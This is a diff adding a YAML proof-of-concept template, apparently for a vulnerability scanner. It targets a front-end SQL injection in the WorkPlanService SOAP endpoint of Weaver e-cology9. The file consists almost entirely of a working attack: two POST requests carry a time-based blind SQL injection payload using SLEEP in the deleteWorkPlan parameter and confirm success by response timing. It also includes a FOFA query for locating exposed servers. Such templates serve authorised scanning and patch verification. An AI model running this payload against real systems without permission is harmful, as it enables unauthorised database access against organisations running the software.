@@ -1,0 +1,39 @@
+id: poc-yaml-e-cology-workplanservice-sqli
+info:
+  name: 泛微e-cology9接口WorkPlanService前台SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: e-cology
+  fofa: app="泛微-协同商务系统"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+  t3: random_int(1,4)
+  t4: t3 + 2
+requests:
+- method: POST
+  path: /services/WorkPlanService
+  headers:
+    Content-Type: text/xml;charset=UTF-8
+  data: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:web=\"webservices.workplan.weaver.com.cn\">\n    <soapenv:Header/>\n \
+    \     <soapenv:Body>\n      <web:deleteWorkPlan>\n         <!--type: string-->\n\
+    \         <web:in0>(SELECT 8544 FROM (SELECT(SLEEP({{.t1}}-(IF(27=27,0,5)))))NZeo)</web:in0>\n\
+    \         <!--type: int-->\n         <web:in1>22</web:in1> \n      </web:deleteWorkPlan>\n\
+    \      </soapenv:Body>\n</soapenv:Envelope>"
+  expression: "status_code == 200 && \ncontains(body,\"ns1:out\") &&\ncontains(body,\"\
+    soap:Body\") &&\nduration >= t1 &&\nduration <= t2 \n"
+- method: POST
+  path: /services/WorkPlanService
+  headers:
+    Content-Type: text/xml;charset=UTF-8
+  data: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:web=\"webservices.workplan.weaver.com.cn\">\n    <soapenv:Header/>\n \
+    \     <soapenv:Body>\n      <web:deleteWorkPlan>\n         <!--type: string-->\n\
+    \         <web:in0>(SELECT 8544 FROM (SELECT(SLEEP({{.t3}}-(IF(27=27,0,5)))))NZeo)</web:in0>\n\
+    \         <!--type: int-->\n         <web:in1>22</web:in1> \n      </web:deleteWorkPlan>\n\
+    \      </soapenv:Body>\n</soapenv:Envelope>"
+  expression: "status_code == 200 && \ncontains(body,\"ns1:out\") &&\ncontains(body,\"\
+    soap:Body\") &&\nduration >= t3 &&\nduration <= t4\n"
+transport: http
